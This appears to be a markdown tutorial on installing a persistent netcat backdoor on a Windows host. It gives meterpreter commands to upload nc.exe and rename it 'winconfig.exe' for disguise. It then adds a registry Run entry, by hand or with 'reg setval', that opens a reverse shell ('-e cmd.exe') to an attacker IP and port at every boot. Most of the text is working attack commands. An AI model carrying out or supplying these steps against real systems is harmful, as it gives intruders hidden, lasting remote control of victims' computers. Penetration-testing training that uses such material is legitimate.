# Netcat Persistent Backdoor
The goal is to install a netcat backdoor that establish a **reverse connection** from the target system which runs Windows, by modifying the registry. This documentation covers two approaches of completing the same tasks: 
* making manual edits in the windows registry editor to initiate a reverse connection
* using Metasploit to achieve the above. 

See [off sec documentation](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/) for a bindshell as well as firewall modification. 

## Preparation
First, we need to get netcat installed on Windows. Maybe we want to rename the program to something less suspicious as well. 

### Upload nc.exe to Windows Host
In Kali, there is alreay a copy of the netcat ready to be pushed at `/usr/share/windows-binaries/nc.exe`

```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```

### Rename nc.exe
This is an optional step for ofuscation. 

First, check that we have the file under `C:\windows\system32`. 
```shell
meterpreter > pwd
C:\WINDOWS

meterpreter > cd system32

meterpreter > search -f nc.exe
Found 1 result...
    c:\WINDOWS\system32\nc.exe (59392 bytes)
```
Then switch to cmd as I didn't find a way to rename file in meterpreter: 
```
meterpreter > shell
Process 3648 created.
Channel 5 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>rename nc.exe winconfig.exe
rename nc.exe winconfig.exe
```

Then you can run netcat by
```
C:\WINDOWS\system32> winconfig [plus the usual options you use with netcat]
```
## Method 1: Make Manual Edits to the Registry

Important: You need to log into an account that has admin privilege. 

On Windows, press `Windows key + r` and search "regedit" to open the registry editor. 
Navigate to `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and add an entry (right click - New - String Value). 

Enter `"C:\WINDOWS\system32\winconfig.exe" [IP addr] [port] -e cmd.exe` in the value field: 

<img src="https://user-images.githubusercontent.com/39619599/118414598-8e4f7b80-b673-11eb-918e-5d4b39d9ceee.png" width=70%>

Then reboot the system. 

Once rebooted, the listener on Kali detects the connection: 

![ccccc](https://user-images.githubusercontent.com/39619599/118414611-a9ba8680-b673-11eb-8cef-b0d5749ffa17.png)

## Method 2: Use Metasploit to Update the Registry

Let's suppose we didn't rename `nc.exe`

See what registry key are in `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
```
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
```

Set new value for netcat
```
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d '"C:\windows\system32\nc.exe" [ip address] [port] -e cmd.exe'
```

See entry
```
meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
```

